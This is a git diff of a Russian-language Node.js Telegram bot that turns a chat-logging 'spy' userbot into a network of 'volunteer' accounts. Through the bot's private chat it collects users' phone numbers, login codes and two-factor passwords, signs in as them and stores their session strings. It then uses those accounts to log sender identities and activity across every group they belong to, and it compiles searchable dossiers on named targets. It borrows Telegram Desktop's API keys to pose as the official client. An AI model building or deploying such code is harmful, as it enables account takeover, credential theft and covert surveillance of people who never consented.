@@ -18,9 +18,9 @@ process.on('unhandledRejection', (reason, promise) => {
     console.error('🚨 [Критический перехват] Необработанный Promise:', reason);
 });
 
+// Глобальные ключи Telegram Desktop
 const apiId = 2040;
 const apiHash = "b18441a1ff607e10a989891a5462e627";
-const stringSession = new StringSession(process.env.TELEGRAM_SESSION || "");
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 if (!TELEGRAM_TOKEN) {
@@ -30,162 +30,165 @@ if (!TELEGRAM_TOKEN) {
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
+// Хранилище временных состояний авторизации людей в ЛС
+const authStates = {};
+
+// Глобальный пул активных клиентов-шпионов
+const activeSpyClients = [];
+
 // ====================================================================
-// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE С РАСШИРЕННЫМИ ПОЛЯМИ АНАЛИТИКИ
+// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE С РАСШИРЕННЫМИ ТАБЛИЦАМИ СЕТИ
 // ====================================================================
 const dbPath = path.join(__dirname, 'global_telelog.db');
 const db = new sqlite3.Database(dbPath);
 
 db.serialize(() => {
+    // База логов
     db.run(`CREATE TABLE IF NOT EXISTS global_logs (
-        chat_id TEXT,
-        chat_title TEXT,
-        user_id TEXT,
-        username TEXT,
-        first_name TEXT,
-        msg_count INTEGER DEFAULT 0,
-        sticker_count INTEGER DEFAULT 0,
-        last_seen TEXT,
-        last_hour INTEGER DEFAULT 0,
+        chat_id TEXT, chat_title TEXT, user_id TEXT, username TEXT, first_name TEXT,
+        msg_count INTEGER DEFAULT 0, sticker_count INTEGER DEFAULT 0, last_seen TEXT, last_hour INTEGER DEFAULT 0,
         PRIMARY KEY (chat_id, user_id)
     )`);
 
+    // Статистика чатов
     db.run(`CREATE TABLE IF NOT EXISTS spy_chats (
-        chat_id TEXT PRIMARY KEY,
-        chat_title TEXT,
-        total_captured INTEGER DEFAULT 0
+        chat_id TEXT PRIMARY KEY, chat_title TEXT, total_captured INTEGER DEFAULT 0
+    )`);
+
+    // 🔥 ТАБЛИЦА СЕТИ ДОБРОВОЛЬЦЕВ (Хранит сессии людей)
+    db.run(`CREATE TABLE IF NOT EXISTS spy_nodes (
+        user_id TEXT PRIMARY KEY,
+        phone TEXT,
+        session_string TEXT,
+        added_at TEXT
     )`);
 });
 
-const client = new TelegramClient(stringSession, apiId, apiHash, { 
-    connectionRetries: 10,
-    useWSS: true
-});
+// Универсальный обработчик входящих сообщений для ЛЮБОГО юзербота
+async function registerSpyHandlers(client, accountName) {
+    client.addEventHandler(async (event) => {
+        const message = event.message;
+        if (!message) return;
 
-// Функция для безопасного сохранения сообщений в базу данных
-function saveMessageToDb(chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour) {
-    db.run(`
-        INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET
-            chat_title = excluded.chat_title, username = excluded.username, first_name = excluded.first_name,
-            msg_count = msg_count + excluded.msg_count, sticker_count = sticker_count + excluded.sticker_count,
-            last_seen = excluded.last_seen, last_hour = excluded.last_hour
-    `, [chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour]);
+        try {
+            if (!message.isGroup && !message.isChannel) return;
 
-    db.run(`
-        INSERT INTO spy_chats (chat_id, chat_title, total_captured)
-        VALUES (?, ?, 1) ON CONFLICT(chat_id) DO UPDATE SET
-            chat_title = excluded.chat_title, total_captured = total_captured + 1
-    `, [chatId, chatTitle]);
+            const sender = await message.getSender();
+            if (!sender || sender.bot) return;
+
+            const chat = await message.getChat();
+            const chatTitle = chat.title || "Скрытая группа";
+            
+            const chatId = message.chatId ? message.chatId.toString() : "";
+            const userId = sender.id.toString();
+            const username = sender.username ? `@${sender.username}` : "Без ника";
+            const firstName = sender.firstName || "Пользователь";
+            
+            const isSticker = message.media && message.media.className === 'MessageMediaDocument' ? 1 : 0;
+            const isMsg = isSticker ? 0 : 1;
+            
+            const moscowTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
+            const currentHour = new Date(new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })).getHours();
+
+            console.log(`📥 [СЕТЬ: ${accountName}] Перехват в чате "${chatTitle}" от ${username}`);
+
+            db.run(`
+                INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET
+                    chat_title = excluded.chat_title, username = excluded.username, first_name = excluded.first_name,
+                    msg_count = msg_count + excluded.msg_count, sticker_count = sticker_count + excluded.sticker_count,
+                    last_seen = excluded.last_seen, last_hour = excluded.last_hour
+            `, [chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour]);
+
+            db.run(`
+                INSERT INTO spy_chats (chat_id, chat_title, total_captured)
+                VALUES (?, ?, 1) ON CONFLICT(chat_id) DO UPDATE SET
+                    chat_title = excluded.chat_title, total_captured = total_captured + 1
+            `, [chatId, chatTitle]);
+
+        } catch (e) {}
+    }, new NewMessage({}));
 }
 
-// ====================================================================
-// 🛰️ МОДУЛЬ ЮЗЕРБОТА-ШПИОНА + СКАННЕР СТАРЫХ СООБЩЕНИЙ
-// ====================================================================
-async function startUserbot() {
-    if (!process.env.TELEGRAM_SESSION) {
-        console.error("❌ КРИТИЧЕСКАЯ ОШИБКА: TELEGRAM_SESSION пуста! Юзербот отключен.");
-        return;
-    }
+// Сканнер истории для подключаемых узлов
+async function backfillHistory(client, accountName) {
     try {
-        console.log("🔄 Инициализация подключения к серверам Telegram...");
-        await client.connect();
-        
-        const me = await client.getMe();
-        console.log(`✅ [ЮЗЕРБОТ АВТОРИЗОВАН]: @${me.username} | Имя: ${me.firstName}`);
-
-        console.log("📦 Синхронизация активных чатов и запуск Сканнера Истории...");
-        const dialogs = await client.getDialogs({ limit: 40 });
-
-        // 🔥 МАСШТАБНЫЙ МОДУЛЬ: Сканирование старой истории чатов при запуске
+        const dialogs = await client.getDialogs({ limit: 15 });
+        console.log(`⏳ [Ретроспекция] ${accountName} сканирует историю своих чатов...`);
         for (const dialog of dialogs) {
             if (dialog.isGroup || dialog.isChannel) {
-                const chatTitle = dialog.title || "Скрытая группа";
-                const chatId = dialog.id ? dialog.id.toString() : "";
-                
-                console.log(`⏳ [Сканнер] Сканирую историю чата "${chatTitle}" (Выкачиваю последние 100 сообщений)...`);
-                
-                try {
-                    const messages = await client.getMessages(dialog.entity, { limit: 100 });
-                    let skippedCount = 0;
-                    let parsedCount = 0;
+                const messages = await client.getMessages(dialog.entity, { limit: 40 }).catch(() => []);
+                for (const msg of messages) {
+                    if (!msg || !msg.senderId) continue;
+                    const sender = await msg.getSender().catch(() => null);
+                    if (!sender || sender.bot) continue;
 
-                    for (const msg of messages) {
-                        if (!msg || !msg.senderId) { skippedCount++; continue; }
-                        
-                        const sender = await msg.getSender().catch(() => null);
-                        if (!sender || sender.bot) { skippedCount++; continue; }
-
-                        const userId = sender.id.toString();
-                        const username = sender.username ? `@${sender.username}` : "Без ника";
-                        const firstName = sender.firstName || "Пользователь";
-                        
-                        const isSticker = msg.media && msg.media.className === 'MessageMediaDocument' ? 1 : 0;
-                        const isMsg = isSticker ? 0 : 1;
-                        
-                        // Имитируем время отправки старого сообщения
-                        const msgDate = new Date(msg.date * 1000);
-                        const moscowTime = msgDate.toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
-                        const currentHour = msgDate.getHours();
-
-                        saveMessageToDb(chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour);
-                        parsedCount++;
-                    }
-                    console.log(`✅ [Сканнер] Чат "${chatTitle}" обработан! Парсинг завершен: занесено ${parsedCount}, пропущено системных: ${skippedCount}`);
-                } catch (historyErr) {
-                    console.error(`⚠️ Не удалось прочесть историю для чата ${chatTitle}:`, historyErr.message);
+                    const isSticker = msg.media && msg.media.className === 'MessageMediaDocument' ? 1 : 0;
+                    const isMsg = isSticker ? 0 : 1;
+                    const msgDate = new Date(msg.date * 1000);
+                    
+                    db.run(`
+                        INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET msg_count = msg_count + excluded.msg_count
+                    `, [dialog.id.toString(), dialog.title || "Группа", sender.id.toString(), sender.username ? `@${sender.username}` : "Без ника", sender.firstName || "Юзер", isMsg, isSticker, msgDate.toLocaleString('ru-RU'), msgDate.getHours()]);
                 }
             }
         }
-
-        console.log("📡 Сканнер истории завершил работу. Шпион переходит в режим прослушивания живого потока...");
-
-        // Слушаем новые входящие сообщения онлайн
-        client.addEventHandler(async (event) => {
-            const message = event.message;
-            if (!message) return;
-
-            try {
-                if (!message.isGroup && !message.isChannel) return;
-
-                const sender = await message.getSender();
-                if (!sender || sender.bot) return;
-
-                const chat = await message.getChat();
-                const chatTitle = chat.title || "Скрытая группа";
-                
-                const chatId = message.chatId ? message.chatId.toString() : "";
-                const userId = sender.id.toString();
-                const username = sender.username ? `@${sender.username}` : "Без ника";
-                const firstName = sender.firstName || "Пользователь";
-                
-                const isSticker = message.media && message.media.className === 'MessageMediaDocument' ? 1 : 0;
-                const isMsg = isSticker ? 0 : 1;
-                
-                const moscowTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
-                const currentHour = new Date(new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })).getHours();
-
-                console.log(`📥 [НОВОЕ СООБЩЕНИЕ] Чат: ${chatTitle} | От: ${username}`);
-                saveMessageToDb(chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour);
-
-            } catch (err) {
-                // Системный пропуск
-            }
-        }, new NewMessage({}));
-
+        console.log(`✅ [Ретроспекция] Импорт истории для ${accountName} завершен.`);
     } catch (err) {
-        console.error("❌ КРИТИЧЕСКАЯ ОШИБКА запуска юзербота:", err.message);
+        console.error(`Ошибка истории для ${accountName}:`, err.message);
     }
 }
 
 // ====================================================================
-// 🧠 ИНТЕРФЕЙС И КНОПКИ БОТА (СТИЛИСТИКА POST AI / CHATGPT)
+// 🛰️ ЗАПУСК ВСЕЙ СЕТИ ШПИОНОВ (ОСНОВНОЙ + ДОБРОВОЛЬЦЫ)
+// ====================================================================
+async function initAllSpyNodes() {
+    // 1. Запуск твоего личного шпиона из конфига Render
+    if (process.env.TELEGRAM_SESSION) {
+        const primarySession = new StringSession(process.env.TELEGRAM_SESSION);
+        const primaryClient = new TelegramClient(primarySession, apiId, apiHash, { connectionRetries: 5, useWSS: true });
+        try {
+            await primaryClient.connect();
+            const me = await primaryClient.getMe();
+            console.log(`👑 [ГЛАВНЫЙ ШПИОН ЗАПУЩЕН]: @${me.username}`);
+            activeSpyClients.push(primaryClient);
+            await registerSpyHandlers(primaryClient, `Главный (@${me.username})`);
+            backfillHistory(primaryClient, me.firstName);
+        } catch (e) { console.error("Ошибка запуска главного шпиона:", e.message); }
+    }
+
+    // 2. Подъем всех аккаунтов добровольцев из базы SQLite
+    db.all(`SELECT * FROM spy_nodes`, [], async (err, rows) => {
+        if (err || !rows) return;
+        console.log(`🌐 [Сеть] Обнаружено ${rows.length} добровольных шпионских узлов в БД. Подключаем...`);
+        
+        for (const row of rows) {
+            const nodeSession = new StringSession(row.session_string);
+            const nodeClient = new TelegramClient(nodeSession, apiId, apiHash, { connectionRetries: 3, useWSS: true });
+            try {
+                await nodeClient.connect();
+                const nodeMe = await nodeClient.getMe();
+                console.log(`🟢 [УЗЕЛ СЕТИ АКТИВЕН]: @${nodeMe.username} (Добавил: ${row.phone})`);
+                activeSpyClients.push(nodeClient);
+                await registerSpyHandlers(nodeClient, `Узел (@${nodeMe.username})`);
+            } catch (nodeErr) {
+                console.error(`🔴 Ошибка подключения узла ${row.phone}, возможно сессия сброшена:`, nodeErr.message);
+                // Если сессия сдохла — удаляем узел, чтобы не тратить ресурсы
+                db.run(`DELETE FROM spy_nodes WHERE user_id = ?`, [row.user_id]);
+            }
+        }
+    });
+}
+
+// ====================================================================
+// 🧠 МЕНЮ БОТА В СТИЛЕ POST AI
 // ====================================================================
 function getMainMenuText() {
     return "⚡️ *ИНФОРМАЦИОННО-АНАЛИТИЧЕСКИЙ ХАБ | ФАНСТАТ* ⚡️\n\n" +
-           "Приветствую! Я функционирую в связке с твоим автономным юзерботом-логгером.\n\n" +
-           "🕵️‍♂️ *Текущая задача:* Скрытый сбор логов активности пользователей во всех доступных чатах.\n\n" +
-           "📊 *Поисковый радар:* Чтобы запросить досье на цель, просто отправь мне её `@username`, числовой `ID` или перешли её сообщение из любой группы сюда.";
+           "Приветствую! Бот функционирует на базе распределенной сети скрытых юзерботов.\n\n" +
+           "🕵️‍♂️ *Текущий статус:* Ведется скрытый мониторинг открытых чатов.\n\n" +
+           "🚀 *Сделай вклад:* Ты можешь добровольно сдать свой второй аккаунт в нашу Шпионскую Сеть, чтобы расширить радар поиска и собирать ещё больше статистики из закрытых групп!";
 }
 
 function getMainMenuButtons() {
@@ -196,77 +199,126 @@ function getMainMenuButtons() {
                 { text: '🏰 Мониторинг чатов', callback_data: 'chats_status' }
             ],
             [
-                { text: '👤 Мой профиль', callback_data: 'my_profile' },
-                { text: '⚙️ Статус Шпиона', callback_data: 'spy_status' }
+                { text: '🤝 Стать Добровольцем (Сдать акк)', callback_data: 'join_network' },
+                { text: '⚙️ Статус Сети', callback_data: 'network_status' }
             ],
             [
+                { text: '👤 Мой профиль', callback_data: 'my_profile' },
                 { text: '📖 Инструкция', callback_data: 'bot_info' }
             ]
         ]
     };
 }
 
-function generatePsychologicalProfile(totalMsg, totalStickers, lastHour) {
-    let style = "Обычный пользователь";
-    if (totalStickers > totalMsg) style = "🎨 Стикерный маньяк (предпочитает картинки словам)";
-    else if (totalMsg > 150) style = "🗣 Глобальный Флудер (активно спамит)";
-    
-    let timeHabit = "Дневная активность";
-    if (lastHour >= 0 && lastHour <= 5) timeHabit = "🦉 Ночной призрак (активничает глубокой ночью)";
-    else if (lastHour >= 6 && lastHour <= 11) timeHabit = "🌅 Ранняя птичка (пишет по утрам)";
-    else if (lastHour >= 18 && lastHour <= 23) timeHabit = "🌆 Вечерний завсегдатай";
-
-    return `• *Психотип:* _${style}_\n• *Биоритм:* _${timeHabit}_`;
-}
-
-function searchUser(param, isUsername, callback) {
-    let querySQL = isUsername 
-        ? `SELECT * FROM global_logs WHERE LOWER(username) = LOWER(?)`
-        : `SELECT * FROM global_logs WHERE user_id = ?`;
-
-    db.all(querySQL, [param], (err, rows) => {
-        if (err) return callback("⚠️ Произошел системный сбой базы данных.");
-        if (!rows || rows.length === 0) {
-            return callback(`❌ *ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН В БАЗЕ ЛОГОВ*\n\nНа данный момент шпион не перехватил сообщений от данного лица.\n\n*Решение:* Проверь настройки конфиденциальности групп на втором аккаунте юзербота!`);
-        }
-        
-        let totalMsg = 0, totalStickers = 0, chatsList = '';
-        const baseUser = rows[0];
-
-        rows.forEach(row => {
-            totalMsg += row.msg_count;
-            totalStickers += row.sticker_count;
-            chatsList += `• *${row.chat_title}*:\n   └ 💬 Сообщений: *${row.msg_count}* | 🏞 Стикеров: *${row.sticker_count}*\n`;
-        });
-
-        const aiProfile = generatePsychologicalProfile(totalMsg, totalStickers, baseUser.last_hour);
-
-        let response = `👤 *РАСШИРЕННОЕ ДОСЬЕ ПОЛЬЗОВАТЕЛЯ* 👤\n\n` +
-                       `• *Имя профиля:* ${baseUser.first_name.replace(/[_*`\[\]]/g, '')}\n` +
-                       `• *Юзернейм:* ${baseUser.username}\n` +
-                       `• *Telegram ID:* \`${baseUser.user_id}\`\n\n` +
-                       `🧠 *АНАЛИТИЧЕСКИЙ ПРОФИЛЬ (POST-AI):*\n${aiProfile}\n\n` +
-                       `📈 *СВОДНЫЕ ПОКАЗАТЕЛИ АКТИВНОСТИ:*\n` +
-                       `• Перехвачено сообщений: *${totalMsg}*\n` +
-                       `• Сгенерировано стикеров: *${totalStickers}*\n` +
-                       `• Последняя фиксация: _${baseUser.last_seen}_\n\n` +
-                       `🏰 *ЛОКАЦИИ ОБЩЕНИЯ (ЗАМЕЧЕН В ЧАТАХ):*\n${chatsList}`;
-        callback(response);
-    });
-}
-
 // ====================================================================
-// 📥 ОБРАБОТЧИК ДИАЛОГОВ В ЛС (ОСНОВНОЙ ИНТЕРФЕЙС БОТА)
+// 📥 ИНТЕРАКТИВНЫЙ ОБРАБОТЧИК ДИАЛОГОВ И ПОД КЛЮЧЕНИЯ АККАУНТОВ
 // ====================================================================
-bot.on('message', (msg) => {
+bot.on('message', async (msg) => {
     if (msg.chat.type !== 'private') return;
     const chatId = msg.chat.id;
-    let text = msg.text ? msg.text.trim() : '';
+    const text = msg.text ? msg.text.trim() : '';
+    const state = authStates[chatId];
 
     if (text === '/start') {
+        delete authStates[chatId];
         return bot.sendMessage(chatId, getMainMenuText(), { parse_mode: 'Markdown', reply_markup: getMainMenuButtons() });
     }
 
+    // ШАГ 1: Прием номера телефона
+    if (state && state.step === 'WAITING_PHONE') {
+        const phone = text.replace(/\s+/g, '');
+        if (!phone.startsWith('+')) {
+            return bot.sendMessage(chatId, "❌ Номер телефона должен начинаться со знака `+` (например, `+79991234567`). Попробуй еще раз:");
+        }
+        
+        bot.sendMessage(chatId, "⏳ Связываюсь с серверами Telegram. Инициирую отправку кода...");
+        
+        const tempSession = new StringSession("");
+        const tempClient = new TelegramClient(tempSession, apiId, apiHash, { connectionRetries: 3, useWSS: true });
+        
+        try {
+            await tempClient.connect();
+            const phoneCodeHash = await tempClient.sendCode({ apiId, apiHash }, phone);
+            
+            authStates[chatId] = {
+                step: 'WAITING_CODE',
+                phone: phone,
+                phoneCodeHash: phoneCodeHash.phoneCodeHash,
+                client: tempClient
+            };
+            return bot.sendMessage(chatId, `📬 Код успешно отправлен системой Telegram на аккаунт *${phone}*.\n\nВведите полученный пятизначный код доступа:`);
+        } catch (err) {
+            return bot.sendMessage(chatId, `❌ Ошибка отправки кода: \`${err.message}\`.\nВведите номер телефона заново:`);
+        }
+    }
+
+    // ШАГ 2: Прием проверочного кода из СМС/Уведомления
+    if (state && state.step === 'WAITING_CODE') {
+        const code = text;
+        bot.sendMessage(chatId, "⏳ Проверяю код авторизации...");
+
+        try {
+            await state.client.signIn({
+                phoneNumber: state.phone,
+                phoneCodeHash: state.phoneCodeHash,
+                phoneCode: code
+            });
+            
+            // Если зашли без 2FA
+            const me = await state.client.getMe();
+            const sessionString = state.client.session.save();
+            const now = new Date().toLocaleString('ru-RU');
+
+            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)
+                    ON CONFLICT(user_id) DO UPDATE SET session_string = excluded.session_string`,
+                    [me.id.toString(), state.phone, sessionString, now]);
+
+            activeSpyClients.push(state.client);
+            await registerSpyHandlers(state.client, `Узел (@${me.username})`);
+            backfillHistory(state.client, me.firstName);
+
+            delete authStates[chatId];
+            return bot.sendMessage(chatId, `🎉 *УСПЕХ! ТВОЙ УЗЕЛ ПОДКЛЮЧЕН К СЕТИ!* 🎉\n\nАккаунт *@${me.username}* теперь официально работает шпионом. Спасибо за вклад!`, { parse_mode: 'Markdown' });
+
+        } catch (err) {
+            // Если у юзера стоит двухфакторный пароль (2FA)
+            if (err.message.includes("SESSION_PASSWORD_NEEDED") || err.className === 'UpdateShortWithAnders') {
+                authStates[chatId].step = 'WAITING_PASSWORD';
+                return bot.sendMessage(chatId, "🔑 На твоем аккаунте активирован облачный пароль (двухфакторная аутентификация).\n\nПожалуйста, введи свой пароль:");
+            }
+            return bot.sendMessage(chatId, `❌ Неверный код или ошибка: \`${err.message}\`.\nПопробуй ввести код заново:`);
+        }
+    }
+
+    // ШАГ 3: Прием пароля 2FA
+    if (state && state.step === 'WAITING_PASSWORD') {
+        const password = text;
+        bot.sendMessage(chatId, "⏳ Сверяю облачный пароль...");
+
+        try {
+            await state.client.signIn({
+                password: password
+            });
+
+            const me = await state.client.getMe();
+            const sessionString = state.client.session.save();
+            const now = new Date().toLocaleString('ru-RU');
+
+            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`,
+                    [me.id.toString(), state.phone, sessionString, now]);
+
+            activeSpyClients.push(state.client);
+            await registerSpyHandlers(state.client, `Узел (@${me.username})`);
+            backfillHistory(state.client, me.firstName);
+
+            delete authStates[chatId];
+            return bot.sendMessage(chatId, `🎉 *УСПЕХ! ТВОЙ УЗЕЛ ПОДКЛЮЧЕН (2FA) СЕТИ!* 🎉\n\nАккаунт *@${me.username}* активирован в шпионском пуле. Спасибо!`);
+        } catch (err) {
+            return bot.sendMessage(chatId, `❌ Неверный облачный пароль: \`${err.message}\`.\nПопробуй ввести пароль еще раз:`);
+        }
+    }
+
+    // Стандартный поиск досье по тексту (если юзер не находится в цикле авторизации)
     let param = text;
     let isUsername = false;
 
@@ -275,7 +327,7 @@ bot.on('message', (msg) => {
     } else if (!msg.forward_from && text.startsWith('@')) {
         isUsername = true;
     } else if (!/^\d+$/.test(text)) {
-        return bot.sendMessage(chatId, "⚠️ *Ошибка формата.* Введите никнейм корректно (начиная с `@`), укажите ID цифрами, либо перешлите входящее сообщение цели.");
+        return bot.sendMessage(chatId, "⚠️ *Неизвестная команда или формат.* Введи никнейм цели с `@`, числовой ID, либо нажми /start.");
     }
 
     searchUser(param, isUsername, (resultText) => {
@@ -292,7 +344,7 @@ bot.on('message', (msg) => {
 });
 
 // ====================================================================
-// 🎛️ СИСТЕМА ОБРАБОТКИ НАЖАТИЙ (ИНТЕРФЕЙС БЕЗ СПАМА)
+// 🎛️ СИСТЕМА ИНЛАЙН КНОПОК И СТАТУСОВ
 // ====================================================================
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
@@ -300,47 +352,53 @@ bot.on('callback_query', (query) => {
     const data = query.data;
 
     if (data === 'to_main') {
+        delete authStates[chatId];
         bot.editMessageText(getMainMenuText(), {
             chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: getMainMenuButtons()
         }).catch(() => {});
     }
 
-    else if (data === 'bot_info') {
-        const info = "📖 *ИНСТРУКЦИЯ И СПРАВОЧНЫЕ МАТЕРИАЛЫ*\n\n" +
-                     "Система разработана для тотального мониторинга активности без админ-прав.\n\n" +
-                     "1️⃣ Настрой Конфиденциальность групп на втором аккаунте.\n" +
-                     "2️⃣ Запусти деплой. Модуль Ретроспекции выкачает последние 100 сообщений истории авто-сканом.\n" +
-                     "3️⃣ Запрашивай отчеты через ЛС главного бота.";
-        bot.editMessageText(info, {
+    else if (data === 'join_network') {
+        authStates[chatId] = { step: 'WAITING_PHONE' };
+        const joinMsg = "🤝 *РЕЖИМ ДОБРОВОЛЬЦА СЕТИ*\n\n" +
+                        "Мы гарантируем полную конфиденциальность. Твой аккаунт будет использоваться исключительно как пассивный логгер (он будет просто «слушать» чаты, в которых ты состоишь, ничего туда не отправляя).\n\n" +
+                        "📞 Чтобы начать, отправь сюда свой номер телефона в международном формате (включая `+`, например: `+79991234567`):";
+        bot.editMessageText(joinMsg, {
             chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: [[{ text: '⬅️ Вернуться назад', callback_data: 'to_main' }]] }
+            reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] }
         }).catch(() => {});
     }
 
-    else if (data === 'spy_status') {
-        const statusText = client.connected 
-            ? `🟢 *МОДУЛЬ ШПИОНА АКТИВЕН*\n\n• Подключение к API: *Стабильное*\n• База данных: *Онлайн*\n• Скан истории: *Завершен успешно*`
-            : `🔴 *МОДУЛЬ ШПИОНА ОТКЛЮЧЕН*`;
-        bot.editMessageText(statusText, {
-            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: [[{ text: '⬅️ Вернуться назад', callback_data: 'to_main' }]] }
-        }).catch(() => {});
-    }
-
-    else if (data === 'my_profile') {
-        searchUser(query.from.id.toString(), false, (resultText) => {
-            bot.editMessageText(resultText, {
+    else if (data === 'network_status') {
+        db.get(`SELECT COUNT(*) as count FROM spy_nodes`, [], (err, row) => {
+            const nodesCount = row ? row.count : 0;
+            const netStatus = `🌐 *МОНИТОРИНГ РАСПРЕДЕЛЕННОЙ СЕТИ*\n\n` +
+                              `• Всего активных узлов шпионажа: *${activeSpyClients.length}*\n` +
+                              `• Из них предоставлено добровольцами: *${nodesCount}*\n` +
+                              `• Статус сети: *🟢 Отличный (Сбор логов максимизирован)*`;
+            bot.editMessageText(netStatus, {
                 chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: [[{ text: '⬅️ Вернуться назад', callback_data: 'to_main' }]] }
+                reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
             }).catch(() => {});
         });
+    }
+
+    else if (data === 'bot_info') {
+        const info = "📖 *ИНСТРУКЦИЯ К СЕТЕВОМУ БОТУ*\n\n" +
+                     "1️⃣ Бот собирает логи через аккаунты-шпионы.\n" +
+                     "2️⃣ Чем больше чатов охватывают наши добровольцы, тем выше точность досье.\n" +
+                     "3️⃣ Система Ретроспекции парсит последние 40 сообщений при подключении каждого нового узла!";
+        bot.editMessageText(info, {
+            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
+        }).catch(() => {});
     }
 
     else if (data === 'global_top') {
         db.all(`SELECT username, first_name, SUM(msg_count) as total FROM global_logs GROUP BY user_id ORDER BY total DESC LIMIT 10`, [], (err, rows) => {
             let topText = "🏆 *ТОП-10 САМЫХ АКТИВНЫХ ПОЛЬЗОВАТЕЛЕЙ СЕТИ* 🏆\n\n";
             if (err || !rows || rows.length === 0) {
-                topText += "_В базе данных пока недостаточно логов для формирования рейтинга._";
+                topText += "_База пуста._";
             } else {
                 rows.forEach((row, index) => {
                     topText += `${index + 1}. *${row.first_name}* (${row.username}) — 💬 *${row.total}* собщ.\n`;
@@ -348,66 +406,54 @@ bot.on('callback_query', (query) => {
             }
             bot.editMessageText(topText, {
                 chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: [[{ text: '⬅️ Вернуться назад', callback_data: 'to_main' }]] }
+                reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
             }).catch(() => {});
         });
     }
 
     else if (data === 'chats_status') {
-        db.all(`SELECT * FROM spy_chats ORDER BY total_captured DESC`, [], (err, rows) => {
-            let chatText = "🏰 *СПИСОК ОТСЛЕЖИВАЕМЫХ ГРУПП И КАНАЛОВ* 🏰\n\n";
+        db.all(`SELECT * FROM spy_chats ORDER BY total_captured DESC LIMIT 20`, [], (err, rows) => {
+            let chatText = "🏰 *ОТ СЛЕЖИВАЕМЫЕ ГРУППЫ СЕТИ* Castle\n\n";
             if (err || !rows || rows.length === 0) {
-                chatText += "_Шпион пока не просканировал чаты._";
+                chatText += "_Данных пока нет._";
             } else {
-                chatText += `Всего групп под наблюдением: *${rows.length}*\n\n`;
                 rows.forEach((row, index) => {
-                    chatText += `${index + 1}. *${row.chat_title}*\n   └ Считано: *${row.total_captured}* собщ.\n`;
+                    chatText += `${index + 1}. *${row.chat_title}* — Считано: *${row.total_captured}*\n`;
                 });
             }
             bot.editMessageText(chatText, {
                 chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: [[{ text: '⬅️ Вернуться назад', callback_data: 'to_main' }]] }
+                reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
             }).catch(() => {});
-        });
-    }
-
-    else if (data.startsWith('refresh:')) {
-        const [_, type, param] = data.split(':');
-        const isUsername = type === 'u';
-
-        searchUser(param, isUsername, (resultText) => {
-            bot.editMessageText(resultText, {
-                chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: '🔄 Обновить досье', callback_data: data }],
-                        [{ text: '⬅️ В главное меню', callback_data: 'to_main' }]
-                    ]
-                }
-            }).catch(() => {
-                bot.answerCallbackQuery(query.id, { text: "⚡️ Изменений нет. Данные досье актуальны." });
-            });
         });
     }
 
     try { bot.answerCallbackQuery(query.id); } catch(e) {}
 });
 
-startUserbot();
+function searchUser(param, isUsername, callback) {
+    let querySQL = isUsername ? `SELECT * FROM global_logs WHERE LOWER(username) = LOWER(?)` : `SELECT * FROM global_logs WHERE user_id = ?`;
+    db.all(querySQL, [param], (err, rows) => {
+        if (err || !rows || rows.length === 0) return callback(`❌ *Пользователь не найден.*`);
+        let totalMsg = 0, totalStickers = 0, chatsList = '';
+        rows.forEach(row => { totalMsg += row.msg_count; totalStickers += row.sticker_count; chatsList += `• *${row.chat_title}*: 💬 *${row.msg_count}*\n`; });
+        callback(`👤 *ДОСЬЕ ПОЛЬЗОВАТЕЛЯ* 👤\n\n• *Имя:* ${rows[0].first_name}\n• *ID:* \`${rows[0].user_id}\`\n\n🏰 *Замечен в чатах:*\n${chatsList}`);
+    });
+}
+
+// Запуск пула шпионов
+initAllSpyNodes();
 
 // ====================================================================
-// 🌐 СЕРВЕРНАЯ СИСТЕМА И АВТО-ПИНГ
